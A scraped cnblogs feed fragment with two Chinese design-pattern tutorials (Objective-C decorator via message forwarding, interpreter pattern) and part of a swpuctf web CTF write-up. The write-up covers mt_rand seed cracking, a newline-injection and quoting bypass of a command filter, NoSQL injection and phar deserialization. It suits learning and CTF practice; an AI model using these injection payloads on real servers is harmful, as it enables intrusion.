&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#import&lt;/span&gt; &amp;lt;Foundation/Foundation.h&amp;gt;&lt;span&gt;
NS_ASSUME_NONNULL_BEGIN
&lt;/span&gt;&lt;span&gt;@protocol&lt;/span&gt; ZHFImageComponent &amp;lt;NSObject&amp;gt;
- (&lt;span&gt;void&lt;/span&gt;&lt;span&gt;)drawAtPoint:(CGPoint)point;
&lt;/span&gt;- (&lt;span&gt;void&lt;/span&gt;&lt;span&gt;)drawAtPoint:(CGPoint)point blendMode:(CGBlendMode)blendMode alpha:(CGFloat)alpha;
&lt;/span&gt;- (&lt;span&gt;void&lt;/span&gt;&lt;span&gt;)drawInRect:(CGRect)rect;
&lt;/span&gt;- (&lt;span&gt;void&lt;/span&gt;&lt;span&gt;)drawInRect:(CGRect)rect blendMode:(CGBlendMode)blendMode alpha:(CGFloat)alpha;
&lt;/span&gt;- (&lt;span&gt;void&lt;/span&gt;&lt;span&gt;)drawAsPatternInRect:(CGRect)rect;
&lt;/span&gt;&lt;span&gt;@end&lt;/span&gt;&lt;span&gt;
NS_ASSUME_NONNULL_END&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Image实例组件代码如下：&lt;/p&gt;
&lt;p&gt;只是声明了遵守ImageComponent的协议。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#import&lt;/span&gt; &amp;lt;UIKit/UIKit.h&amp;gt;
&lt;span&gt;#import&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;ZHFImageComponent.h&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
NS_ASSUME_NONNULL_BEGIN
&lt;/span&gt;&lt;span&gt;@interface&lt;/span&gt; UIImage (ZHFImageComponent) &amp;lt;ZHFImageComponent&amp;gt;
&lt;span&gt;@end&lt;/span&gt;&lt;span&gt;
NS_ASSUME_NONNULL_END&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;装饰器接口代码如下：&lt;/p&gt;
&lt;p&gt; .h文件&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#import&lt;/span&gt; &amp;lt;Foundation/Foundation.h&amp;gt;
&lt;span&gt;#import&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;ZHFImageComponent.h&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
NS_ASSUME_NONNULL_BEGIN
&lt;/span&gt;&lt;span&gt;@interface&lt;/span&gt; ZHFImageFilter : NSObject &amp;lt;ZHFImageComponent&amp;gt;&lt;span&gt;
{
    &lt;/span&gt;&lt;span&gt;@private&lt;/span&gt;
    &lt;span&gt;id&lt;/span&gt;&amp;lt;ZHFImageComponent&amp;gt;&lt;span&gt; component_;
}
@property (nonatomic, strong) &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&amp;lt;ZHFImageComponent&amp;gt;&lt;span&gt; component;
&lt;/span&gt;- (instancetype)initWithImageComponent:(&lt;span&gt;id&lt;/span&gt;&amp;lt;ZHFImageComponent&amp;gt;&lt;span&gt;)component;
&lt;/span&gt;- (&lt;span&gt;void&lt;/span&gt;&lt;span&gt;)apply;
&lt;/span&gt;- (&lt;span&gt;id&lt;/span&gt;&lt;span&gt;)forwardingTargetForSelector:(SEL)aSelector;
&lt;/span&gt;&lt;span&gt;@end&lt;/span&gt;&lt;span&gt;
NS_ASSUME_NONNULL_END&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; .m文件&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#import&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;ZHFImageFilter.h&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;@implementation&lt;/span&gt;&lt;span&gt; ZHFImageFilter
&lt;/span&gt;&lt;span&gt;@synthesize&lt;/span&gt; component =&lt;span&gt; component_;
&lt;/span&gt;- (instancetype)initWithImageComponent:(&lt;span&gt;id&lt;/span&gt;&amp;lt;ZHFImageComponent&amp;gt;&lt;span&gt;)component {
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (self =&lt;span&gt; [super init]) {
        self.component &lt;/span&gt;=&lt;span&gt; component;
    }
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; self;
}
&lt;/span&gt;- (&lt;span&gt;id&lt;/span&gt;&lt;span&gt;)forwardingTargetForSelector:(SEL)aSelector {
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; ([NSStringFromSelector(aSelector) hasPrefix:&lt;span&gt;@&quot;&lt;/span&gt;&lt;span&gt;draw&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;]) {
        [self apply];
    }
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;使用消息转发给另一个对象处理，来实现任务处理链条，非常巧妙！！！&lt;/span&gt;
    &lt;span&gt;return&lt;/span&gt;&lt;span&gt; component_;
}
&lt;/span&gt;&lt;span&gt;@end&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;forwardingTargetForSelector方法的实现是整个装饰器的灵魂，子类其实只是调用父类的这个方法而已。&lt;/p&gt;
&lt;p&gt;形变装饰器代码如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#import&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;ZHFImageFilter.h&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
NS_ASSUME_NONNULL_BEGIN
&lt;/span&gt;&lt;span&gt;@interface&lt;/span&gt;&lt;span&gt; ZHFImageTransformFilter : ZHFImageFilter
{
    &lt;/span&gt;&lt;span&gt;@private&lt;/span&gt;&lt;span&gt;
    CGAffineTransform transform_;
}
@property (nonatomic, assign) CGAffineTransform transform;
&lt;/span&gt;- (instancetype)initWithImageComponent:(&lt;span&gt;id&lt;/span&gt;&amp;lt;ZHFImageComponent&amp;gt;&lt;span&gt;)component
                             transform:(CGAffineTransform)transform;
&lt;/span&gt;&lt;span&gt;@end&lt;/span&gt;&lt;span&gt;
NS_ASSUME_NONNULL_END

&lt;/span&gt;&lt;span&gt;#import&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;ZHFImageTransformFilter.h&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;@implementation&lt;/span&gt;&lt;span&gt; ZHFImageTransformFilter
&lt;/span&gt;&lt;span&gt;@synthesize&lt;/span&gt; transform =&lt;span&gt; transform_;
&lt;/span&gt;- (instancetype)initWithImageComponent:(&lt;span&gt;id&lt;/span&gt;&amp;lt;ZHFImageComponent&amp;gt;&lt;span&gt;)component
                             transform:(CGAffineTransform)transform {
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (self =&lt;span&gt; [super initWithImageComponent:component]) {
        transform_ &lt;/span&gt;=&lt;span&gt; transform;
    }
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; self;
}
&lt;/span&gt;- (&lt;span&gt;void&lt;/span&gt;&lt;span&gt;)apply {
    CGContextRef context &lt;/span&gt;=&lt;span&gt; UIGraphicsGetCurrentContext();
    CGContextConcatCTM(context, transform_);
}
&lt;/span&gt;&lt;span&gt;@end&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;可以看到，形变装饰器只是实现了apply方法，并没有对forwardingTargetForSelector方法做任何处理。&lt;/p&gt;

&lt;p&gt;调用流程如下：&lt;/p&gt;
&lt;p&gt;1.向ImageTransformFilter发送 drawInRect消息&lt;/p&gt;
&lt;p&gt;2.ImageTransformFilter因为没有drawInRect方法，而调用父类的forwardingTargetForSelector方法&lt;/p&gt;
&lt;p&gt;3.在父类的forwardingTargetForSelector方法中 包含 [selfapply];&lt;/p&gt;
&lt;p&gt;4.当在父类中调用[selfapply];代码时，会执行ImageTransformFilter的apply方法。（方法的泛型）&lt;/p&gt;
&lt;p&gt;5.最后调用returncomponent_;，将消息传给下一个图像滤镜组件。&lt;/p&gt;
&lt;p&gt;6.重复1-5的过程。完成了消息的转发过程，形成任务处理链条。&lt;/p&gt;

&lt;p&gt;完整的demo实现: https://github.com/zhfei/Objective-C_Design_Patterns&lt;/p&gt;
</description>
<pubDate>Thu, 27 Dec 2018 15:23:00 +0000</pubDate>
<dc:creator>滴水微澜</dc:creator>
<og:description>在OC中，当像一个对象发送消息，而对象找到消息后，从它的类方法列表，父类方法列表，一直找到根类方法列表都没有找到与这个选择子对应的函数指针。那么这个对象就会触发消息转发机制。 OC对象的继承链和isa</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/zhou--fei/p/10188140.html</dc:identifier>
</item>
<item>
<title>23种设计模式之解释器模式 - 牛牛的编程之路</title>
<link>http://www.cnblogs.com/hujingnb/p/10171605.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/hujingnb/p/10171605.html</guid>
<description>&lt;p&gt;定义: 给定一门语言,定义它的文法的一种表示, 并定义一个解释器, 该解释器使用该表示来解释语言中的句子.&lt;/p&gt;
&lt;p&gt;其类图如下:&lt;/p&gt;
&lt;div class=&quot;pgc-img&quot;&gt;&lt;img src=&quot;http://p3.pstatp.com/large/pgc-image/153380354639878fe4a8477&quot; alt=&quot;23种设计模式之解释器模式&quot;/&gt;&lt;p class=&quot;pgc-img-caption&quot;&gt; &lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;其中的角色说明:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;AbstractExpression 抽象解释器: 具体的解释任务由各个实现类完成&lt;/li&gt;
&lt;li&gt;TerminalExpression 终结符表达式: 实现与文法中的元素相关联的解释操作, 通常一个解释器模式中只有一个终结符表达式, 但有多个实例,对应不同的终结符&lt;/li&gt;
&lt;li&gt;NonterminalExpression 非终结符表达式: 文法中的每条规则对应于一个非终结符表达式. 非终结符表达式根据逻辑的复杂程度而增加,原则上每个文法规则都对应一个非终结符表达式&lt;/li&gt;
&lt;li&gt;Context 环境角色&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;抽象表达式代码:&lt;/p&gt;
&lt;div class=&quot;pgc-img&quot;&gt;&lt;img src=&quot;http://p99.pstatp.com/large/pgc-image/1533803813234fdf8ded165&quot; alt=&quot;23种设计模式之解释器模式&quot;/&gt;&lt;p class=&quot;pgc-img-caption&quot;&gt; &lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;抽象表达式通常只有一个方法, 抽象表达式是生成语法集合的关键, 每个语法集合完成指定语法解析任务, 它是通过递归调用的方式,最终由最小的语法单元进行解析完成&lt;/p&gt;
&lt;p&gt;终结符表达式代码:&lt;/p&gt;
&lt;div class=&quot;pgc-img&quot;&gt;&lt;img src=&quot;http://p99.pstatp.com/large/pgc-image/1533803961293b098a2d099&quot; alt=&quot;23种设计模式之解释器模式&quot;/&gt;&lt;p class=&quot;pgc-img-caption&quot;&gt; &lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;通常,终结符表达式比较简单,主要是处理场景元素和数据的转换&lt;/p&gt;
&lt;p&gt;非终结符表达式:&lt;/p&gt;
&lt;div class=&quot;pgc-img&quot;&gt;&lt;img src=&quot;http://p99.pstatp.com/large/pgc-image/15338040953995a0c1a2911&quot; alt=&quot;23种设计模式之解释器模式&quot;/&gt;&lt;p class=&quot;pgc-img-caption&quot;&gt; &lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;每个非终结符表达式都代表了一个文法规则, 并且每个文法规则都只关心自己周边的文法规则的结果, 因此这就产生了每个非终结符表达式调用自己周边的非终结符表达式, 然后最终、最小的文法规则就是终结符表达式,终结符表达式的概念就是如此, 不能够再参与比自己更小的文法运算了&lt;/p&gt;
&lt;p&gt;场景类代码:&lt;/p&gt;
&lt;div class=&quot;pgc-img&quot;&gt;&lt;img src=&quot;http://p3.pstatp.com/large/pgc-image/15338043517592bbbe4862f&quot; alt=&quot;23种设计模式之解释器模式&quot;/&gt;&lt;p class=&quot;pgc-img-caption&quot;&gt; &lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;通常Client是一个封装类, 封装的结果就是传递进来一个规范语法文件,解析器分析后产生结果并返回,避免了调用者与语法解析器的耦合关系&lt;/p&gt;

&lt;p&gt;解释器模式的优点:&lt;/p&gt;
&lt;p&gt;解释器是一个简单语法分析工具,它最显著的优点就是扩展性,修改语法规则只要修改相应的非终结符表达式就可以了, 若扩展语法, 则只要增加非终结符就可以了&lt;/p&gt;
&lt;p&gt;解释器模式的缺点:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;解释器模式会引起类膨胀. 每个语法都要产生一个非终结符表达式,语法规则比较复杂时,就可能产生大量的类文件, 为维护带来了非常多的麻烦&lt;/li&gt;
&lt;li&gt;解释器模式采用递归调用方法. 每个非终结符表达式之关心与自己有关的表达式,每个表达式需要知道最终的结果, 必须一层一层的剥茧,无论是面向对象的语言还是面向过程的语言,递归都是在必要条件下使用的, 它导致调试非常复杂.&lt;/li&gt;
&lt;li&gt;效率问题. 解释器模式由于使用了大量的循环和递归,效率是一个不容忽视的问题,特别是一用于解析复杂、冗长的语法时,效率是难以忍受的&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;解释器模式使用的场景:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;重复发生的问题可以使用解释器模式. 例如, 多个应用服务器,每天产生大量的日志,需要对日志文件进行分析处理,由于各个服务器的日志格式不同,但是数据要素是相同的,按照解释器的说法就是终结符表达式都是相同的,但是非终结符表达式就需要制定了.&lt;/li&gt;
&lt;li&gt;一个简单语法需要解释的场景. 为什么是简单?看看非中介表达式,文法规则越多,复杂度越高,而且类间还要进行递归调用. 想想看, 多个类之间的调用你需要什么样的耐心和信心去排查问题. 因此,解释器模式一般用来解析比较标准的字符集, 例如SQL语法分析,不过该部分逐渐被专用工具所取代&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;尽量不要在重要的模块中使用解释器模式,否则维护会是一个很大的问题.在项目中可以使用shell、JRuby等脚本语言来代替解释器模式,你不Java编译型语言的不足.&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;解释器模式在实际的系统开发中使用的非常少, 因为它会引起效率、性能以及维护等问题,一般在大中型的框架型项目中能够找到它的身影, 如一些数据分析工具、报表设计工具、科学计算工具等, 若你确实遇到&quot;一种特定类型的问题发生的频率足够高&quot;的情况,准备使用解释器模式时, 可以考虑一下 Expression4J、MESP、Jep等开源的解析工具包,功能都异常强大,而且非常容易使用,效率也还不错,实现大多数的数学运算完全没有问题.&lt;/p&gt;
&lt;hr/&gt;

&lt;p&gt;可以关注一下鄙人的公众号, 谢谢各位了!&lt;img src=&quot;https://img2018.cnblogs.com/blog/1457859/201812/1457859-20181224224508758-2106722284.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Thu, 27 Dec 2018 15:19:00 +0000</pubDate>
<dc:creator>牛牛的编程之路</dc:creator>
<og:description>解释器模式的定义 定义: 给定一门语言,定义它的文法的一种表示, 并定义一个解释器, 该解释器使用该表示来解释语言中的句子. 其类图如下: 其中的角色说明: 抽象表达式代码: 抽象表达式通常只有一个方</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/hujingnb/p/10171605.html</dc:identifier>
</item>
<item>
<title>swpuctf-web部分学习总结 - tr1ple</title>
<link>http://www.cnblogs.com/wfzWebSecuity/p/10159489.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/wfzWebSecuity/p/10159489.html</guid>
<description>&lt;p&gt;&lt;span&gt;1.用优惠码 买个 X ?&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;（1）第一步：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;这道题第一步主要知道利用php的随机种子数泄露以后就可以利用该种子数来预测序列，而在题目中会返回15位的优惠码，但是必须要24位的优惠码，因此要根据15位的求出种子以后扩展到24位，这里的优惠码因为是字符串形式的，所以需要整理成数字形式，也就是整理成方便 php_mt_seed 测试的格式。&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;43&quot;&gt;
&lt;pre&gt;
&amp;lt;?&lt;span&gt;php
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;生成优惠码&lt;/span&gt;
&lt;span&gt;$_SESSION&lt;/span&gt;['seed']=&lt;span&gt;rand&lt;/span&gt;(0,999999999&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;function&lt;/span&gt;&lt;span&gt; youhuima(){
    &lt;/span&gt;&lt;span&gt;mt_srand&lt;/span&gt;(&lt;span&gt;$_SESSION&lt;/span&gt;['seed'&lt;span&gt;]);
    &lt;/span&gt;&lt;span&gt;$str_rand&lt;/span&gt; = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;$auth&lt;/span&gt;=''&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;$len&lt;/span&gt;=15&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; ( &lt;span&gt;$i&lt;/span&gt; = 0; &lt;span&gt;$i&lt;/span&gt; &amp;lt; &lt;span&gt;$len&lt;/span&gt;; &lt;span&gt;$i&lt;/span&gt;++&lt;span&gt; ){
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;$i&lt;/span&gt;&amp;lt;=(&lt;span&gt;$len&lt;/span&gt;/2&lt;span&gt;))
              &lt;/span&gt;&lt;span&gt;$auth&lt;/span&gt;.=&lt;span&gt;substr&lt;/span&gt;(&lt;span&gt;$str_rand&lt;/span&gt;,&lt;span&gt;mt_rand&lt;/span&gt;(0, &lt;span&gt;strlen&lt;/span&gt;(&lt;span&gt;$str_rand&lt;/span&gt;) - 1), 1&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;
              &lt;span&gt;$auth&lt;/span&gt;.=&lt;span&gt;substr&lt;/span&gt;(&lt;span&gt;$str_rand&lt;/span&gt;,(&lt;span&gt;mt_rand&lt;/span&gt;(0, &lt;span&gt;strlen&lt;/span&gt;(&lt;span&gt;$str_rand&lt;/span&gt;) - 1))*-1, 1&lt;span&gt;);
    }
    &lt;/span&gt;&lt;span&gt;setcookie&lt;/span&gt;('Auth', &lt;span&gt;$auth&lt;/span&gt;&lt;span&gt;);
}
&lt;/span&gt;?&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;比如我们现在有一条优惠码为:&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;youhuima = &quot;hM7HljJR5ZHzWGF&quot;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;生成优惠码的字符串范围为&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;php hljs&quot;&gt;$str_rand = &lt;span class=&quot;hljs-string&quot;&gt;&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;&lt;/span&gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;hljs-string&quot;&gt;此时我们可以利用已经有的优惠码在字符串中找到其对应的位置，也就是mt_rand的每一次的值，因为前8位都是一样的生成方式，所以我们只需要利用前8位来爆破出种子就可以了，因为php每次调用mt_rand使用的种子都是一样的。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;hljs-string&quot;&gt;因此利用以下代码还原优惠码的位置，并按照php_mt_rand接受的形式生成：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
When invoked with 4 numbers, the first 2 give the bounds for the first mt_rand() output and the second 2 give the range passed into mt_rand().
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;也就是说当包含4个数字时，前两个应该是mt_rand生成的边界值，后面两个应该是mt_rand的取值范围。&lt;/p&gt;
&lt;p&gt;所以有以下代码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&amp;lt;?&lt;span&gt;php
&lt;/span&gt;&lt;span&gt;$str&lt;/span&gt; = &quot;hM7HljJ&quot;&lt;span&gt;; #只需要7位
&lt;/span&gt;&lt;span&gt;$randStr&lt;/span&gt; = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;&lt;span&gt;;

&lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(&lt;span&gt;$i&lt;/span&gt;=0;&lt;span&gt;$i&lt;/span&gt;&amp;lt;&lt;span&gt;strlen&lt;/span&gt;(&lt;span&gt;$str&lt;/span&gt;);&lt;span&gt;$i&lt;/span&gt;++&lt;span&gt;){
   &lt;/span&gt;&lt;span&gt;$pos&lt;/span&gt; = &lt;span&gt;strpos&lt;/span&gt;(&lt;span&gt;$randStr&lt;/span&gt;,&lt;span&gt;$str&lt;/span&gt;[&lt;span&gt;$i&lt;/span&gt;&lt;span&gt;]);
   &lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; &lt;span&gt;$pos&lt;/span&gt;.&quot; &quot;.&lt;span&gt;$pos&lt;/span&gt;.&quot; &quot;.&quot;0 &quot;.(&lt;span&gt;strlen&lt;/span&gt;(&lt;span&gt;$randStr&lt;/span&gt;)-1).&quot; &quot;&lt;span&gt;;
   &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;整理成方便 php_mt_seed 测试的格式
  //php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]]&lt;/span&gt;
&lt;span&gt;}
&lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; &quot;\n&quot;&lt;span&gt;;
&lt;/span&gt;?&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;然后输出为：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
7 7 0 61 48 48 0 61 33 33 0 61 43 43 0 61 11 11 0 61 9 9 0 61 45 45 0 61
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;此时便可以运行php_mt_rand来爆破种子了：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201812/1063309-20181222155351228-1230131080.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;此时有了种子，只要根据上面生成优惠码的代码跑一次，生成长度为24的优惠码就可以了，到此第一步完成，主要知道在我们没有设置种子数的时候，php会我们自动播种，并且每次生成随机数都用的是相同的种子，因此可以爆破种子。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;（2）第二步：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;这一步主要熟悉php的preg_match函数的bypass技巧&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt;support&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt; (&lt;span&gt;preg_match&lt;/span&gt;(&quot;/^\d+\.\d+\.\d+\.\d+$/im&quot;,&lt;span&gt;$ip&lt;/span&gt;&lt;span&gt;)){
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;preg_match&lt;/span&gt;(&quot;/\?|flag|}|cat|echo|\*/i&quot;,&lt;span&gt;$ip&lt;/span&gt;&lt;span&gt;)){
               &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;执行命令&lt;/span&gt;
        }&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
              &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;flag字段和某些字符被过滤!&lt;/span&gt;
&lt;span&gt;        }
    }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
             &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 你的输入不正确!&lt;/span&gt;
    }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这里使用了/im也就是不区分大小写并且使用多行匹配的模式，那么在多行匹配中只要第一行满足就会返回正确，所以只要使用多行来绕过就可以了，那么我们只要在第一行满足的情况下添加一个换行符然后后面拼接payload就可以了，也就是1.1.1.1%0a即可。&lt;/p&gt;
&lt;p&gt;绕过第一层的过滤以后，第二层对一些命令和flag字符串进行的过滤，并且不能大小写绕过，并且也过滤了？和*这两个通配符，因为已经知道flag在/下面，所以直接读取：&lt;/p&gt;
&lt;p&gt;可以以通过 f’la’g 或f[l][a]g等来绕过对flag的过滤，对文件可以用more，less命令也都行，如果非要用cat，也可以使用绕过flag相同的方法，这里我们使用grep -ri / flag* 就崩了，可能是查找的太多。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2.&lt;/span&gt;&lt;span&gt;injection ???&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;这道题主要考nosql的注入，首先信息搜集以下，发现info.php，一般在phpinfo中我们可以看到php开了哪些扩展，在这里发现了mongodb，大胆猜测应该是php+mongodb，所以后面利用正则匹配出admin的密码就可以了，没啥好说的。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;3.&lt;/span&gt;&lt;span&gt;SimplePHP&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;以前一直懒，没去看pop链的构造，刚好这次题目中有这个所以好好学习了一下。&lt;/span&gt;&lt;span&gt;这道题主要考察的是phar的反序列以及pop链的构造，&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
利用phar文件会以序列化的形式存储用户自定义的meta-data这一特性，拓展了php反序列化漏洞的攻击面。&lt;br/&gt;该方法在文件系统函数（&lt;span&gt;file_exists&lt;/span&gt;()、&lt;span&gt;is_dir&lt;/span&gt;()等）参数可控的情况下，配合phar:&lt;span&gt;//&lt;/span&gt;&lt;span&gt;伪协议，可以不依赖unserialize()直接进行反序列化操作。&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这里重点是可以不依赖unserialize()这个反序列化的函数，更加骚气了。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar:&lt;span&gt;//&lt;/span&gt;&lt;span&gt;伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201812/1063309-20181222162434836-16532580.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这么多函数都会通过phar进行反序列化操作，而我们的利用点需要满足：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1.phar文件要能够上传到服务器端。
2.要有可用的魔术方法作为“跳板”。
3.文件操作函数的参数可控，且&lt;/span&gt;:、/、phar等特殊字符没有被过滤。
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;下面来分析以下题目已经有的信息：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;$file&lt;/span&gt; = &lt;span&gt;$_GET&lt;/span&gt;[&quot;file&quot;] ? &lt;span&gt;$_GET&lt;/span&gt;['file'] : &quot;&quot;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;empty&lt;/span&gt;(&lt;span&gt;$file&lt;/span&gt;&lt;span&gt;)) {
    &lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; &quot;&amp;lt;h2&amp;gt;There is no file to show!&amp;lt;h2/&amp;gt;&quot;&lt;span&gt;;
}
&lt;/span&gt;&lt;span&gt;$show&lt;/span&gt; = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Show();
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;file_exists&lt;/span&gt;(&lt;span&gt;$file&lt;/span&gt;&lt;span&gt;)) {
    &lt;/span&gt;&lt;span&gt;$show&lt;/span&gt;-&amp;gt;source = &lt;span&gt;$file&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;$show&lt;/span&gt;-&amp;gt;&lt;span&gt;_show();
} &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;empty&lt;/span&gt;(&lt;span&gt;$file&lt;/span&gt;&lt;span&gt;)){
    &lt;/span&gt;&lt;span&gt;die&lt;/span&gt;('file doesn\'t exists.'&lt;span&gt;);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;在这里会对我们传的file文件调用file_exist()函数进行判断是否存在，对照上图可以发现这个函数的确存在漏洞，并且file是我们可以控制的。&lt;/p&gt;
